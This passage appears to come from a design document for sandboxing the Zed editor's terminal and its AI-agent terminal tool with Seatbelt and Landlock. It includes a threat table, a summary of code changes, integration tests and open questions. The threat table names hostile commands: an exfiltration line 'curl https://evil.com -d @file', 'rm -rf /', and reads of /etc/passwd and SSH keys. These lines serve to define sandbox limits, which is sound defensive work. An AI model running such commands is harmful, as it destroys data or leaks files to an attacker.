| Run `cargo build` | ❌ | Unless `~/.cargo/bin`, `~/.rustup/toolchains` (executable), `~/.cargo/registry`, `~/.cargo/git` (read+write) are in the allowlist. |
| Run `ls /Users/you/Documents` | ❌ | Not in any allowlist. |
| Run `cat /etc/passwd` | ✅ (read-only) | Needed for shell `~` expansion. Contains no secrets on modern systems. |
| Run `ssh remote-server` | ❌ | Unless `~/.ssh` is added as read-only. Can't read keys or config. |
| Exfiltrate data over the network | ✅ if `allow_network: true` | `curl https://evil.com -d @file` works — but can only read files within the sandbox. The most sensitive thing it could send is project source code. Set `allow_network: false` for maximum paranoia. |
| Run `sudo anything` | ❌ on Linux (`NO_NEW_PRIVS`), restricted on macOS (sandbox persists as root) | By design. |
| Write to `/usr/bin` or `/etc` | ❌ | Read-only or read+exec only. |
| Read `~/.ssh/id_ed25519` | ❌ | Not in default baseline. |
| Read `~/.zshrc` | ✅ (read-only) | In baseline for shell startup. If it contains secrets, that's a risk. |
| Modify `~/.zshrc` | ❌ | Read-only. |
| Create files in `/tmp` | ✅ | Needed for compilation and many tools. |
| Run `rm -rf /` | Partially succeeds on writable paths only | Can delete project files and temp files. Cannot touch system dirs, home dir (except project), or other users' files. |
| Read other users' home directories | ❌ | Not in any allowlist. |
| Install malware in `/usr/local/bin` | ❌ | Read+exec only, not writable. |

---

## Code Changes Summary

### In `crates/settings_content/src/terminal.rs`
- Add `SandboxSettingsContent`, `SystemPathsSettingsContent`, `SandboxApplyTo` structs.
- Add `pub sandbox: Option<SandboxSettingsContent>` to `ProjectTerminalSettingsContent`.

### In `crates/terminal/src/terminal_settings.rs`
- Add resolved `SandboxConfig` and `ResolvedSystemPaths` types.
- Add `pub sandbox: Option<SandboxConfig>` to `TerminalSettings`.
- Implement default resolution logic with `#[cfg]`-gated OS-specific defaults.

### In `crates/terminal/src/terminal.rs` (`TerminalBuilder::new`)
- Read sandbox settings from `TerminalSettings`.
- When sandbox is enabled, filter env vars using the allowlist.
- Pass `SandboxConfig` through to `alacritty_terminal::tty::Options`.

### In the alacritty fork (`alacritty_terminal/src/tty/mod.rs`)
- Add `pub sandbox: Option<SandboxConfig>` to `Options`.

### In the alacritty fork (`alacritty_terminal/src/tty/unix.rs`)
- In `from_fd()`, when `config.sandbox.is_some()`, call `builder.env_clear()` before setting env vars.
- In the `pre_exec` closure, after `set_controlling_terminal` and `close(slave_fd)/close(master_fd)`, but before signal setup, insert the platform-specific sandbox call.

### New file: sandbox implementation (in the alacritty fork or in `crates/terminal/src/`)
- `sandbox_macos.rs`: Seatbelt FFI bindings + SBPL profile generation (~150 lines).
- `sandbox_linux.rs`: Landlock ruleset construction using the `landlock` crate (~120 lines).

### In the alacritty fork's `Cargo.toml`
- Add `landlock = "0.4"` under `[target.'cfg(target_os = "linux")'.dependencies]`.

### In `crates/acp_thread/src/terminal.rs` (`create_terminal_entity`)
- Check the `apply_to` setting to decide whether the agent terminal tool gets sandboxed.
- If yes, pass the `SandboxConfig` through to `TerminalBuilder::new()`.

### In `crates/terminal/src/terminal.rs` or `crates/project/src/terminals.rs`
- In the user terminal creation path (`create_terminal_shell_internal` or equivalent), check `apply_to` to decide whether to pass `SandboxConfig`.

### In `assets/settings/default.json`
- Add default sandbox settings (disabled by default) with documentation comments.

---

## Integration Tests

Integration tests live in `crates/terminal/src/sandbox_tests.rs`, gated on `#[cfg(test)]` and `#[cfg(unix)]`. They exercise the **real kernel sandbox** (not mocks) by spawning actual child processes and verifying OS enforcement.

### Test helper

A shared helper `run_sandboxed_command()` spawns a terminal via `TerminalBuilder::new()`, runs a shell command, waits for exit, and returns `(exit_status, output)`. It takes a `SandboxTestConfig` that controls whether sandboxing is enabled and which paths are allowed.

A `create_test_directory()` helper creates a temp directory with known files for verification.

### Test: `rm -rf` blocked by sandbox, allowed without

Creates a target temp directory with files, and a separate project directory. Runs `rm -rf <target>` twice:

1. **Sandboxed (sandbox enabled):** Verifies the target directory and all its files still exist afterward. The sandbox only grants write access to the project dir, not the target.
2. **Unsandboxed (sandbox disabled):** Verifies the target directory was deleted. This proves the sandbox was the reason it was blocked in run 1, not some other cause.

### Test: Writes succeed inside the project directory

With sandbox enabled, creates a file inside the project directory via `echo > file`. Verifies the file exists with the expected contents. Proves the sandbox doesn't over-restrict.

### Test: Reads blocked outside the project

Creates a "secret" file in a separate temp directory. With sandbox enabled, tries to `cat` it and redirect output to a file in the project dir. Verifies the output file either doesn't exist or doesn't contain the secret content.

### Test: `additional_read_write_paths` grants access

Creates an external temp directory. First runs a write command to it **without** it in `additional_read_write_paths` — verifies the write failed. Then runs the same command **with** it in `additional_read_write_paths` — verifies the write succeeded.

### Test: `additional_read_only_paths` allows read, blocks write

Creates a temp directory with an existing file containing known content. Adds it as a read-only path.

1. Reads the file into the project dir — verifies the content matches (read works).
2. Tries to overwrite the file — verifies the original content is unchanged (write blocked).

### Test: Env var filtering

With sandbox enabled:

1. Checks that `HOME` (in the default allowlist) is present in the child's environment.
2. Checks that `AWS_SECRET` (not in the allowlist) is absent.

### Test: Network blocking (macOS only)

With sandbox enabled and `allow_network: false`, tries `curl https://example.com`. Verifies the response does not contain the expected HTML content.

### Test: Landlock graceful degradation (Linux only)

Verifies that with sandbox enabled, a basic `echo` command succeeds — proving that the code path handles `RulesetStatus::NotEnforced` (or any status) gracefully without crashing.

### Running the tests

```sh
# macOS (tests Seatbelt)
cargo test -p terminal sandbox_tests

# Linux (tests Landlock, needs kernel 5.13+)
cargo test -p terminal sandbox_tests
```

`--test-threads=1` is recommended for easier failure diagnosis, but parallel execution should also work since each test uses its own temp directories.

---

## Open Questions and Future Work

1. **Shell config secrets:** Should Zed warn the user if their `.zshrc` or `.bashrc` contains what looks like secrets (env var assignments with `KEY`, `TOKEN`, `SECRET`, `PASSWORD` in the name)? This is the most likely source of data leakage from the default baseline.

2. **`$TMPDIR` on macOS:** The per-user temp directory (`/var/folders/...`) is dynamically assigned. The current plan allows the entire `/var/folders` tree. A tighter approach would resolve `$TMPDIR` at spawn time and only allow that specific subdirectory.

3. **Symlink resolution:** Both Seatbelt and Landlock operate on real paths. If `/etc` is a symlink to `/private/etc` (as on macOS), both the symlink and the target may need to be in the allowlist. The SBPL `(subpath ...)` directive and Landlock's `PathFd` both follow symlinks, but this should be tested thoroughly.

4. **Windows sandboxing:** Deferred to a future phase. The most viable options are:
   - WSL2 + Landlock (real security, but Linux shell, not Windows shell).
   - Sandboxie-Plus (real security, native Windows shell, but requires one-time kernel driver install by the user).
   - AppContainer (real security, native Windows shell, but mutates DACLs on the host filesystem and requires cleanup).

5. **Container-based isolation:** A future phase could offer opt-in container isolation using Apple's Containerization framework (macOS), native Linux namespaces + cgroups (Linux), or WSL2 (Windows). This provides stronger isolation (separate filesystem root, disposable writes) at the cost of requiring a base image/rootfs and losing the "native feel" on macOS.

6. **Audit logging:** When a sandboxed process is denied access to a path, the denial is silent (the syscall fails with `EPERM`). It would be useful to surface these denials in Zed's UI (e.g., a notification or a log in the terminal panel) so users can understand why something failed and add the path to their allowlist. On macOS, sandbox violations are logged to the system log (`/var/log/system.log` or `log show --predicate 'eventMessage contains "Sandbox"'`). On Linux, Landlock ABI V7 (kernel 6.15+) adds audit logging.

7. **Per-project sandbox settings:** The sandbox settings live in `ProjectTerminalSettingsContent`, which means they can be set in `.zed/settings.json` per project. A project could ship a `.zed/settings.json` that declares exactly which paths its build system needs, making it easy for contributors to get a working sandboxed setup.
